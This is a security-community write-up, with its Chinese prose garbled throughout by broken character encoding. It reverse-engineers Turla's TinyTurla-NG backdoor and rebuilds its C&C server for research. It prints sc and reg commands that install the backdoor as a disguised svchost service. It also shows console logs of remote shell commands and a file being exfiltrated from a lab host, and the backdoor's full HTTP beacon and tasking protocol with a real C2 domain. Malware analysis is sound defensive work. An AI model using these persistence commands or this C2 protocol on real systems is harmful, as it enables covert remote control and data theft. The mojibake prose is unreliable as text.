

# é€†å‘å¼€å‘ Turla ç»„ç»‡ TinyTurla-NG æ–°åé—¨ C&C ç«™ç‚¹ - å…ˆçŸ¥ç¤¾åŒº

é€†å‘å¼€å‘ Turla ç»„ç»‡ TinyTurla-NG æ–°åé—¨ C&C ç«™ç‚¹

- - -

## æ¦‚è¿°

åœ¨ä¸Šä¸€ç¯‡ã€Šé€†å‘å¼€å‘ Turla ç»„ç»‡ TinyTurla åé—¨æ§åˆ¶ç«¯ã€‹æ–‡ç« ä¸­ï¼Œç¬”è€…å…ˆä» TinyTurla åé—¨å…¥æ‰‹ï¼Œå¯¹ TinyTurla åé—¨å¼€å±•äº†ç›¸å…³ç ”ç©¶åˆ†æå·¥ä½œï¼Œé€šè¿‡å¯¹ TinyTurla åé—¨çš„é€šä¿¡æ¨¡å‹è¿›è¡Œè¯¦ç»†çš„å‰–æï¼Œæ¨¡æ‹Ÿæ„å»ºäº† TinyTurla åé—¨çš„æ§åˆ¶ç«¯ã€‚

å› æ­¤ï¼Œåœ¨æœ¬ç¯‡æ–‡ç« ä¸­ï¼Œç¬”è€…å°†æŒ‰ç…§ä¸Šä¸€ç¯‡æ–‡ç« çš„ç ”ç©¶æ€è·¯ï¼Œå°è¯•å¯¹æ€ç§‘ Talos å›¢é˜Ÿã€ŠTinyTurla Next Generation - Turla APT spies on Polish NGOsã€‹ï¼ˆ [https://blog.talosintelligence.com/tinyturla-next-generation/](https://blog.talosintelligence.com/tinyturla-next-generation/) ï¼‰æŠ¥å‘Šä¸­æåˆ°çš„ Turla ç»„ç»‡ä½¿ç”¨çš„æ–°åé—¨ï¼ˆTinyTurla-NGï¼‰è¿›è¡Œç ”ç©¶åˆ†æï¼Œå¹¶ä»å¦‚ä¸‹è§’åº¦å¼€å±•ç ”ç©¶å·¥ä½œï¼š

-   TinyTurla-NG æ–°åé—¨ä¸ TinyTurla åé—¨çš„æ¤å…¥æ–¹å¼ç›¸åŒï¼Œå‡æ˜¯ä»¥æœåŠ¡ DLL çš„å½¢å¼å‡ºç°ï¼Œå¹¶ä¸”å‡æ˜¯é€šè¿‡ svchost.exe å¯åŠ¨ï¼Œå› æ­¤å…ˆå°è¯•å¯¹ TinyTurla-NG æ–°åé—¨çš„è¿è¡Œåœºæ™¯è¿›è¡Œå¤ç°ï¼›
-   TinyTurla-NG æ–°åé—¨çš„åŠŸèƒ½ä»£ç è¾ƒ TinyTurla åé—¨å¤æ‚ä¸€äº›ï¼Œé€šè¿‡å¯¹ TinyTurla-NG æ–°åé—¨å¼€å±•é€†å‘åˆ†æå·¥ä½œï¼Œå¯¹å…¶æ ·æœ¬åŠŸèƒ½åŠè¿è¡Œé€»è¾‘è¿›è¡Œè¯¦ç»†å‰–ææ¢³ç†ï¼›
-   é€šè¿‡åŠ¨æ€è°ƒè¯•ï¼Œç ”ç©¶åˆ†æ TinyTurla-NG æ–°åé—¨çš„é€šä¿¡æ¨¡å‹ï¼›
-   å°è¯•æ„å»º TinyTurla-NG æ–°åé—¨ C&C ç«™ç‚¹ï¼Œæ¨¡æ‹Ÿå¤ç° TinyTurla-NG æ–°åé—¨çš„è¿œç¨‹æ§åˆ¶è¡Œä¸ºåŠæ¶æ„æµé‡ã€‚

ç›¸å…³æŠ¥å‘Šæˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-a388c5c2357ddd90a3864ebc68323500.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083334-d75325a6-d507-1.png)

## æ–°åé—¨ C&C ç«™ç‚¹æ•ˆæœ

é€šè¿‡æ„å»º TinyTurla-NG æ–°åé—¨ C&C ç«™ç‚¹ç¨‹åºï¼Œæˆ‘ä»¬å¯æ¨¡æ‹Ÿå®ç° TinyTurla-NG æ–°åé—¨çš„ä½¿ç”¨åœºæ™¯ã€‚

C&C ç«™ç‚¹ç¨‹åºå¯ç”¨åï¼Œæˆ‘ä»¬å¯æ­£å¸¸è®¿é—®å…¶ WEB æœåŠ¡ï¼Œç›¸å…³æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-42ba5748ae7d93d1cd417fb21c98989d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083349-e04f9aae-d507-1.png)

[![](assets/1709105912-b306bde2a7afb89c43dd93136eac314c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083402-e80fc764-d507-1.png)

TinyTurla-NG æ–°åé—¨ä¸Šçº¿åï¼Œå³å¯å¼€å±•æ­£å¸¸çš„è¿œæ§è¡Œä¸ºï¼Œç›¸å…³æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-404e73109744636df06b09d5ab76de4d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083416-efd6b944-d507-1.png)

é€šä¿¡è¿‡ç¨‹ä¸­ C&C ç«™ç‚¹ä¸­å†…ç½®çš„è¿œæ§æŒ‡ä»¤å¦‚ä¸‹ï¼š

[![](assets/1709105912-a81eafb0e7c5212d260fe6b4072ded73.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083428-f788c664-d507-1.png)

é€šä¿¡è¿‡ç¨‹ä¸­ C&C ç«™ç‚¹è®°å½•çš„è¿œæ§æŒ‡ä»¤å“åº”ç»“æœå¦‚ä¸‹ï¼š

[![](assets/1709105912-4839ca31fdc36c65b9bc7f5bb64d29cf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083446-01c85c2a-d508-1.png)

é€šä¿¡è¿‡ç¨‹ä¸­ C&C ç«™ç‚¹å¯¹çªƒå–çš„æ–‡ä»¶å†…å®¹è¿›è¡Œä¿å­˜ï¼Œç›¸å…³æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-ade90ff0ad8edabbddde3efea261e8e9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083458-09172650-d508-1.png)

é€šä¿¡è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ http é€šä¿¡æ•°æ®åŒ…æˆªå›¾å¦‚ä¸‹ï¼šï¼ˆ**å°† TinyTurla-NG æ–°åé—¨æ–‡ä»¶ä¸­çš„å†…ç½® https å¤–è” URL ä¿®æ”¹ä¸º http å¤–è” URL å³å¯å®ç°å¯¹ HTTP ç«™ç‚¹çš„è®¿é—®**ï¼‰

[![](assets/1709105912-e975bbf8e9fbdc1f77c092783b3542a9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083510-10682fe4-d508-1.png)

ç›¸å…³æ“ä½œå‘½ä»¤å¦‚ä¸‹ï¼š

```plain
F:\GolandProjects\awesomeProject3>awesomeProject3.exe
[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.

[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
 - using env:   export GIN_MODE=release
 - using code:  gin.SetMode(gin.ReleaseMode)

307b5c9a Client Ready
[GIN] 2024/02/26 - 13:43:15 |[97;42m 200 [0m|      1.0621ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
[GIN] 2024/02/26 - 13:43:25 |[97;42m 200 [0m|       1.686ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
[GIN] 2024/02/26 - 13:43:35 |[97;42m 200 [0m|      2.0395ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a [+] ShortTimer and FailCounter changed. New ShortTimer is 1 minute & New FailCounter is 1
[GIN] 2024/02/26 - 13:43:36 |[97;42m 200 [0m|      1.5504ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
[GIN] 2024/02/26 - 13:43:42 |[97;42m 200 [0m|      1.8533ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
Microsoft Windows [ï¿½æ±¾ 6.1.7601]
ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½

C:\Windows\system32>chcp 437 > NUL

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Bluetooth ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Ethernet adapter ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::5c38:ccd5:e424:fdfc%11
   IPv4 Address. . . . . . . . . . . : 192.168.153.130
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Tunnel adapter isatap.{8B288427-3826-4FFD-BF89-490C950BBA8A}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Tunnel adapter isatap.localdomain:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::5efe:192.168.153.130%15
   Default Gateway . . . . . . . . . :

C:\Windows\system32>exit

[GIN] 2024/02/26 - 13:43:43 |[97;42m 200 [0m|     15.2158ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
[GIN] 2024/02/26 - 13:43:50 |[97;42m 200 [0m|      2.0944ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
Microsoft Windows [ï¿½æ±¾ 6.1.7601]
ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½

C:\Windows\system32>chcp 437 > NUL

C:\Windows\system32>calc.exe

C:\Windows\system32>exit

[GIN] 2024/02/26 - 13:43:53 |[97;42m 200 [0m|      1.0216ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
[GIN] 2024/02/26 - 13:44:00 |[97;42m 200 [0m|      1.9848ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
Microsoft Windows [ï¿½æ±¾ 6.1.7601]
ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½

C:\Windows\system32>chcp 437 > NUL

C:\Windows\system32>dir C:\Users\admin\Desktop
 Volume in drive C has no label.
 Volume Serial Number is DEA8-B705

 Directory of C:\Users\admin\Desktop

2024/02/26  11:31    <DIR>          .
2024/02/26  11:31    <DIR>          ..
2024/02/22  23:13               507 111.txt
2011/09/29  09:22            32,256 apateDNS.exe
2019/01/23  23:23            45,272 nc64.exe
2023/11/27  14:41             2,182 Process Hacker 2.lnk
2023/11/27  14:39    <DIR>          snapshot_2023-11-18_02-28
2023/11/27  14:40             1,315 x96dbg.exe - ????.lnk
              15 File(s)     14,600,939 bytes
               4 Dir(s)  49,213,665,280 bytes free

C:\Windows\system32>exit

[GIN] 2024/02/26 - 13:44:00 |[97;42m 200 [0m|      1.9138ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
[GIN] 2024/02/26 - 13:44:06 |[97;42m 200 [0m|       652.7Âµs | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"

[GIN] 2024/02/26 - 13:44:06 |[97;42m 200 [0m|         521Âµs | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
[GIN] 2024/02/26 - 13:44:08 |[97;42m 200 [0m|      3.0731ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a [+] File C:\Users\admin\Desktop\111.txt posted

[GIN] 2024/02/26 - 13:44:08 |[97;42m 200 [0m|      1.4707ms | 192.168.153.130 |[97;46m POST    [0m "/wp-includes/blocks/rss.old.php"
307b5c9a
```

## æ–°åé—¨è¿è¡Œåœºæ™¯å¤ç°

æ ¹æ®æŠ¥å‘Šä¸­çš„æè¿°ï¼ŒTinyTurla-NG æ–°åé—¨ä¸ TinyTurla åé—¨çš„æ¤å…¥æ–¹å¼ç›¸åŒï¼Œå‡æ˜¯ä»¥æœåŠ¡ DLL çš„å½¢å¼å‡ºç°ï¼Œå¹¶ä¸”å‡æ˜¯é€šè¿‡ svchost.exe å¯åŠ¨ã€‚å› æ­¤ï¼Œä¸ºäº†èƒ½å¤Ÿå¿«é€Ÿå¯¹ TinyTurla-NG æ–°åé—¨çš„è¿è¡Œåœºæ™¯è¿›è¡Œå¤ç°ï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡ä»¿ã€Šé€†å‘å¼€å‘ Turla ç»„ç»‡ TinyTurla åé—¨æ§åˆ¶ç«¯ã€‹æ–‡ç« ä¸­é’ˆå¯¹ TinyTurla åé—¨çš„è¿è¡Œåœºæ™¯å¤ç°æ–¹æ³•ï¼Œå¯¹ TinyTurla-NG æ–°åé—¨çš„è¿è¡Œåœºæ™¯è¿›è¡Œå¤ç°ã€‚

å…ˆå°† TinyTurla-NG æ–°åé—¨é‡å‘½åä¸º w64time.dllï¼Œç„¶ååœ¨ cmd ä¸­æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ï¼Œå³å¯å¯¹ TinyTurla-NG æ–°åé—¨çš„è¿è¡Œåœºæ™¯è¿›è¡Œæœ‰æ•ˆå¤ç°ï¼š

```plain
copy "w64time.dll" %systemroot%\system32\

sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start= auto
sc config W64Time DisplayName= "Windows 64 Time"
sc description W64Time "Maintain date and time synch on all clients and services in the network"

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f

sc start W64Time
```

ç›¸å…³æ‰§è¡Œæ•ˆæœæˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-12c813ba82f85a4d6ad72084defa68d6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083532-1d593d74-d508-1.png)

## æ ·æœ¬åŠŸèƒ½åˆ†æ

é€šè¿‡å¯¹ TinyTurla-NG æ–°åé—¨è¿›è¡Œé€†å‘åˆ†æï¼Œæ¢³ç† TinyTurla-NG æ–°åé—¨è¿è¡Œé€»è¾‘å¦‚ä¸‹ï¼š

-   æœåŠ¡æˆåŠŸå¯åŠ¨åï¼Œå°†è°ƒç”¨ ServiceMain å‡½æ•°ï¼Œåœ¨ ServiceMain å‡½æ•°ä¸­ï¼Œå°†è°ƒç”¨ beginthreadex å‡½æ•°åˆ›å»ºä¸»æ„ŸæŸ“çº¿ç¨‹ï¼›
-   åœ¨ä¸»æ„ŸæŸ“çº¿ç¨‹ä¸­ï¼Œæ ·æœ¬å°†åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ï¼š
    -   ç¬¬ä¸€ä¸ªçº¿ç¨‹ä¸»è¦ç”¨äºå‘ C&C å‘èµ·ç½‘ç»œé€šä¿¡ï¼›
    -   ç¬¬äºŒä¸ªçº¿ç¨‹ä¸»è¦ç”¨äºå¯¹ç¬¬ä¸€ä¸ªçº¿ç¨‹ä¸­æ¥æ”¶çš„è¿œæ§å‘½ä»¤è¿›è¡Œæ‰§è¡Œï¼›

### åˆ›å»ºä¸»æ„ŸæŸ“çº¿ç¨‹

æœåŠ¡æˆåŠŸå¯åŠ¨åï¼Œæ ·æœ¬å°†è°ƒç”¨ ServiceMain å‡½æ•°ã€‚åœ¨ ServiceMain å‡½æ•°ä¸­ï¼Œæ ·æœ¬å°†é€šè¿‡è°ƒç”¨ beginthreadex å‡½æ•°æ¥åˆ›å»ºä¸»æ„ŸæŸ“çº¿ç¨‹ã€‚beginthreadex å‡½æ•°çš„ç¬¬å››ä¸ªå‡½æ•°å‚æ•°ä¸ºçº¿ç¨‹å…¥å£å‡½æ•°å‚æ•°ï¼Œåœ¨æ­¤æ ·æœ¬ä¸­ä¼ å…¥çš„æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œæœ€åé€šè¿‡åœ¨å…¥å£å‡½æ•°ä¸­è°ƒç”¨ç»“æ„ä½“ä¸­çš„å‡½æ•°åœ°å€ä»¥å®ç°çº¿ç¨‹æ‰§è¡Œã€‚

ç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-4f2234ab74a4c7d26d906365f189ddb7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083552-291a9ff4-d508-1.png)

[![](assets/1709105912-3cc87d6bc461ed69a2ee053789c8db94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083608-32ff1d88-d508-1.png)

### åˆå§‹åŒ–é…ç½®ç»“æ„ä½“

è¿›å…¥ä¸»æ„ŸæŸ“çº¿ç¨‹åï¼Œæ ·æœ¬å°†æ‰§è¡Œä¸€ç³»åˆ—åˆå§‹åŒ–æ“ä½œï¼Œå¯¹åç»­ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€éœ€çš„é…ç½®ä¿¡æ¯è¿›è¡Œåˆå§‹åŒ–ã€‚

ç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-5fa95cb3159589de7c60ac218e16da5d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083626-3d6ebb52-d508-1.png)

### æ£€æµ‹ powershell ç‰ˆæœ¬åŠ windows ç‰ˆæœ¬

åœ¨å¼€å§‹è¿œæ§åŠŸèƒ½æ—¶ï¼Œæ ·æœ¬è¿˜å°†å°è¯•è·å– powershell ç‰ˆæœ¬åŠ windows ç‰ˆæœ¬ä¿¡æ¯ï¼Œè‹¥ powershell ç‰ˆæœ¬å¤§äºç­‰äº 5ï¼Œåˆ™åç»­å°†è°ƒç”¨ powershell ç”¨äºæ‰§è¡Œè¿œæ§ shell æŒ‡ä»¤ã€‚

ç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-1a2849ac5eb5dacc64ef37d0d427c6e0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083642-4758ff24-d508-1.png)

[![](assets/1709105912-56fd780be2b7cc9b51426136a3e52126.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083659-5142b908-d508-1.png)

### çº¿ç¨‹ä¸€

çº¿ç¨‹ä¸€ä¸»è¦ç”¨äºå‘ C&C å‘èµ·ç½‘ç»œé€šä¿¡ï¼Œå‘èµ·ç½‘ç»œé€šä¿¡ä½¿ç”¨çš„ API ä¸º WINHTTPï¼Œç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-c61e7e288a39f5487b52c1e2ab9b7800.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083716-5b393bda-d508-1.png)

### çº¿ç¨‹äºŒ

çº¿ç¨‹äºŒä¸»è¦ç”¨äºå¯¹ç¬¬ä¸€ä¸ªçº¿ç¨‹ä¸­æ¥æ”¶çš„è¿œæ§å‘½ä»¤è¿›è¡Œæ‰§è¡Œï¼Œç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-a5e475a695ce413991448d3ed4ce5057.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083734-66203f9e-d508-1.png)

### è¿œæ§æŒ‡ä»¤

é€šè¿‡åˆ†æï¼Œå‘ç° TinyTurla-NG æ–°åé—¨æ”¯æŒå¤šä¸ªè¿œæ§æŒ‡ä»¤ï¼Œè¿œæ§æŒ‡ä»¤å¤–çš„å‘½ä»¤å°†ä»¥ shell æ–¹å¼è¿›è¡Œæ‰§è¡Œã€‚

ç‰¹æ®ŠæŒ‡ä»¤å¦‚ä¸‹ï¼š

| æŒ‡ä»¤  | å¤‡æ³¨  |
| --- | --- |
| changepoint | æ£€ç´¢åœ¨å—æ„ŸæŸ“ç«¯ç‚¹ä¸Šæ‰§è¡Œå‘½ä»¤çš„ç»“æœ |
| timeout | é‡æ–°é…ç½®åé—¨å‘ C&C å‘èµ·ä»»åŠ¡è¯·æ±‚çš„é—´éš”ä¼‘çœ æ—¶é—´ |
| changeshell | åˆ‡æ¢æ‰§è¡Œ shell çš„æ–¹å¼ï¼Œåœ¨ powershell ä¸ cmd ä¹‹é—´åˆ‡æ¢ |
| get | ä» C&C å¤„è·å–æ–‡ä»¶å¹¶ä¿å­˜ |
| post | ä¸Šä¼ æ–‡ä»¶è‡³ C&C å¤„ |
| killme | åˆ é™¤æ–‡ä»¶ |

#### æ‰§è¡Œ shell å‘½ä»¤

ç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-536c71a969a19ab177c72bf60ef28629.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083753-71607752-d508-1.png)

#### timeout æŒ‡ä»¤

ç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-3b3a4719ee3d4f3954bfad217b69e091.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083810-7bc75e90-d508-1.png)

#### post æŒ‡ä»¤

ç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-e29c2cab96e5ab5235b777679a60abf1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083827-857c707e-d508-1.png)

#### killme æŒ‡ä»¤

ç›¸å…³ä»£ç æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-1c40c5c563bf72c20d68f6c99f2a9138.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083842-8e80ff28-d508-1.png)

### å¤–è”åœ°å€

é€šè¿‡åˆ†æï¼Œå‘ç° TinyTurla-NG æ–°åé—¨çš„å¤–è”åœ°å€æ˜¯ä»¥æ˜æ–‡å½¢å¼å­˜æ”¾äºæ ·æœ¬æ–‡ä»¶ä¸­çš„ï¼Œç›¸å…³æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-4a4044e56fcd59df3d6db5537eb3bd09.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083859-988ef4b6-d508-1.png)

## C&C æ€è€ƒ

é€šè¿‡å¯¹ TinyTurla-NG æ–°åé—¨è¿›è¡Œé€†å‘åˆ†æï¼Œæˆ‘ä»¬å‘ç°æ­¤æ ·æœ¬çš„ C&C åœ°å€ä¸º WEB æœåŠ¡ç½‘ç«™ã€‚

ç»“åˆæ€ç§‘æŠ¥å‘Šä¸­å…³äº C&C çš„æè¿°ï¼Œæˆ‘ä»¬å‘ç° TinyTurla-NG æ–°åé—¨çš„éƒ¨åˆ† C&C åœ°å€å­˜åœ¨æ–‡ä»¶è·¯å¾„æ³„éœ²ï¼Œç›¸å…³æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-370f2f72c032fd70d0cf59ed68a2c6dc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083915-a292a926-d508-1.png)

åŸºäºæ–‡ä»¶è·¯å¾„æ³„éœ²ä¿¡æ¯ï¼Œæˆ‘ä»¬å¾—çŸ¥åœ¨ C&C ä¸Šå­˜åœ¨å¤šä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè‹¥èƒ½å¤Ÿè·å–ç›¸å…³æ—¥å¿—æ–‡ä»¶ï¼Œæˆ‘ä»¬å³å¯æ›´è¿›ä¸€æ­¥çš„äº†è§£æ•´ä¸ªæ”»å‡»æ´»åŠ¨çš„æƒ…å†µï¼š

-   åŸºäºæ–‡ä»¶è·¯å¾„æ³„éœ²ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯é€šè¿‡ç©ºé—´æµ‹ç»˜å¹³å°æˆ–ç›´æ¥æ‰«ææ¢æµ‹ï¼ŒæŒ–æ˜æ‰©çº¿ TinyTurla-NG æ–°åé—¨çš„ C&C åœ°å€ï¼›
-   åŸºäº log.txt æ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å¯è·å–æ‰€æœ‰å—æ§ IP ä¿¡æ¯ï¼›
-   åŸºäº tasks.txtã€result.txt æ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å¯å¤ç°è¿˜åŸæ”»å‡»è€…åœ¨æ”»å‡»æ´»åŠ¨ä¸­çš„æ‰€æœ‰çªƒå¯†è¡Œä¸ºï¼›

## åé—¨é€šä¿¡æ¨¡å‹åˆ†æ

é€šè¿‡å¯¹ TinyTurla-NG æ–°åé—¨é€šä¿¡æ¨¡å‹è¿›è¡Œåˆ†æï¼Œå‘ç° TinyTurla-NG æ–°åé—¨çš„ HTTP è¯·æ±‚ä¸»è¦åˆ†ä¸ºå¦‚ä¸‹æƒ…å†µï¼š

-   POST è¯·æ±‚ä¸­ï¼Œè¡¨å•æ•°æ®åç§°ä¸º"result"ï¼šä¸»è¦ç”¨äºå‘é€ä¸Šçº¿è®¤è¯ä¿¡æ ‡åŠå‘½ä»¤æ‰§è¡Œåçš„å“åº”æ•°æ®ï¼›
-   POST è¯·æ±‚ä¸­ï¼Œè¡¨å•æ•°æ®åç§°ä¸º"gettask"ï¼šä¸»è¦ç”¨äºè¯·æ±‚è·å–è¿œæ§æŒ‡ä»¤ï¼›
-   POST è¯·æ±‚ä¸­ï¼Œè¡¨å•æ•°æ®åç§°ä¸º"file"ï¼šä¸»è¦ç”¨äºå‘é€æ–‡ä»¶å†…å®¹ï¼›
-   POST å“åº”è¯·æ±‚ä¸­ï¼Œå®é™…è¿œæ§æŒ‡ä»¤å‰éœ€è¦æºå¸¦â€œrsp:â€å­—ç¬¦ä¸²ï¼›

ç›¸å…³æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-71f6d17018ef1e0d84020a0f02e7fad0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083932-ac6c27ec-d508-1.png)

### ä¸Šçº¿è®¤è¯

é€šè¿‡åˆ†æï¼Œå‘ç° TinyTurla-NG æ–°åé—¨è¿è¡Œåï¼Œå°†é¦–å…ˆå‘é€ä¸Šçº¿è®¤è¯æ•°æ®ï¼Œä¾¿äº C&C å¯¹å—æ§ä¸»æœºçš„è¿œæ§è¡Œä¸ºæ•°æ®è¿›è¡Œç®¡ç†ã€‚åœ¨ä¸Šçº¿è®¤è¯é€šä¿¡ä¸­ï¼Œåé—¨å°†å‘é€â€œClient Readyâ€å­—ç¬¦ä¸²ä½œä¸ºä¿¡æ ‡è¿›è¡Œå‘é€ã€‚

è¯¦ç»†æƒ…å†µå¦‚ä¸‹ï¼š

```plain
#**********TinyTurla-NG æ–°åé—¨ -> C&C ç«™ç‚¹**********
POST /wp-includes/blocks/rss.old.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary="-"
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Content-Length: 190
Host: jeepcarlease.com

---
Content-Disposition: form-data;name="id"
Content-Type: text/plain

307b5c9a
---
Content-Disposition: form-data;name="result"
Content-Type: text/plain

Client Ready
-----
....  

#**********C&C ç«™ç‚¹ -> TinyTurla-NG æ–°åé—¨**********
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 26 Feb 2024 03:35:54 GMT
Content-Length: 4

rsp:
```

### è¿œæ§åŠŸèƒ½

é€šè¿‡åˆ†æï¼Œå‘ç° TinyTurla-NG æ–°åé—¨æ”¯æŒå¤šç§è¿œæ§æŒ‡ä»¤ï¼Œé€šä¿¡æ¨¡å‹ç»“æ„ä¸»è¦æœ‰ä¸¤ç§ç±»å‹ï¼š

-   è¿œæ§æŒ‡ä»¤ä¸ºé™¤ä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶å¤–çš„å¸¸è§„æŒ‡ä»¤ï¼›
-   è¿œæ§æŒ‡ä»¤ä¸ºä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ç±»æŒ‡ä»¤ï¼›

#### å¸¸è§„æŒ‡ä»¤

å¸¸è§„æŒ‡ä»¤çš„é€šä¿¡æ¨¡å‹æƒ…å†µå¦‚ä¸‹ï¼š

```plain
#**********TinyTurla-NG æ–°åé—¨ -> C&C ç«™ç‚¹**********
POST /wp-includes/blocks/rss.old.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary="-"
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Content-Length: 175
Host: jeepcarlease.com

---
Content-Disposition: form-data;name="id"
Content-Type: text/plain

307b5c9a
---
Content-Disposition: form-data;name="gettask"
Content-Type: text/plain

-----
.a

#**********C&C ç«™ç‚¹ -> TinyTurla-NG æ–°åé—¨**********
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 26 Feb 2024 03:36:01 GMT
Content-Length: 15

rsp:timeout 1 1

#**********TinyTurla-NG æ–°åé—¨ -> C&C ç«™ç‚¹**********
POST /wp-includes/blocks/rss.old.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary="-"
